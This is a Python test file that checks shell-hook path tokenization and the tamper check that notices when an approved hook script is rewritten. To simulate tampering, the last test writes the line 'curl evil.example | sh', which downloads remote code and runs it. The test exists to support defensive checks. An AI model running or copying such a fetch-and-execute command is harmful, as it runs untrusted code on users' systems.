"""Fork-owned tests moved out of ``tests/agent/test_shell_hooks.py`` (lane CARRY).

Same names, same bodies; the upstream file is byte-identical to upstream.
"""

from __future__ import annotations
from agent import shell_hooks

from tests.agent.test_shell_hooks import (  # noqa: F401 — upstream names the moved tests use
    _reset_registration_state,
    _write_script,
)


class TestCommandTokenization:
    r"""The hook command is a PATH, and it has to survive being tokenized.

    ``shlex`` in POSIX mode reads ``\`` as an escape, so on a host whose
    path separator IS ``\`` it silently deletes every separator. That is not
    a cosmetic mangling: ``script_mtime_iso`` then returns ``None``, and the
    "script modified since approval" tamper check in ``hermes_cli/hooks.py``
    is written as ``if mtime_now and mtime_at and mtime_now > mtime_at`` — so
    a ``None`` makes it unconditionally fall through and an approved hook can
    be rewritten with arbitrary content while ``hermes doctor`` prints OK.

    These pin the mechanism against THIS platform's own spelling rather than
    against a hardcoded ``C:\...`` literal, so they mean something on every
    host instead of only where they were written.
    """

    def test_platform_path_survives_tokenization(self, tmp_path):
        script = _write_script(tmp_path, "hook.sh", "#!/bin/sh\nexit 0\n")
        command = str(script)
        assert shell_hooks.split_command_line(command) == [command]

    def test_interpreter_prefixed_platform_path_survives(self, tmp_path):
        script = _write_script(tmp_path, "hook.py", "print('{}')\n")
        command = f"python {script}"
        assert shell_hooks.split_command_line(command) == ["python", str(script)]
        assert shell_hooks._command_script_path(command) == str(script)

    def test_quoted_path_with_spaces_yields_a_bare_token(self, tmp_path):
        spaced = tmp_path / "dir with spaces"
        spaced.mkdir()
        script = _write_script(spaced, "hook.sh", "#!/bin/sh\nexit 0\n")
        assert shell_hooks.split_command_line(f'"{script}"') == [str(script)]

    def test_mtime_resolves_for_a_platform_spelled_path(self, tmp_path):
        script = _write_script(tmp_path, "hook.sh", "#!/bin/sh\nexit 0\n")
        assert shell_hooks.script_mtime_iso(str(script)) is not None
        assert shell_hooks.script_is_executable(str(script))

    def test_rewriting_an_approved_hook_is_detectable(self, tmp_path, monkeypatch):
        """The guarantee the tamper check exists for, pinned end to end.

        Recorded approval mtime, then a rewrite, must produce a STRICTLY
        greater mtime — which is exactly the comparison _doctor_one makes.
        Both halves of this seam were individually fine before the fix; only
        the join was untested, and the join was where the hole was.
        """
        import os as _os

        script = _write_script(tmp_path, "hook.sh", "#!/bin/sh\nexit 0\n")
        # Pin the approval-time mtime to a fixed past instant so the
        # comparison cannot depend on filesystem timestamp granularity.
        _os.utime(script, (1_000_000_000, 1_000_000_000))

        monkeypatch.setenv("HERMES_HOME", str(tmp_path / "hermes_home"))
        shell_hooks._record_approval("on_session_start", str(script))
        entry = shell_hooks.allowlist_entry_for("on_session_start", str(script))
        assert entry is not None
        recorded = entry["script_mtime_at_approval"]
        assert recorded is not None, (
            "approval recorded no mtime, so the drift check has nothing to "
            "compare against and can never fire"
        )

        script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
        now = shell_hooks.script_mtime_iso(str(script))
        assert now is not None and now > recorded
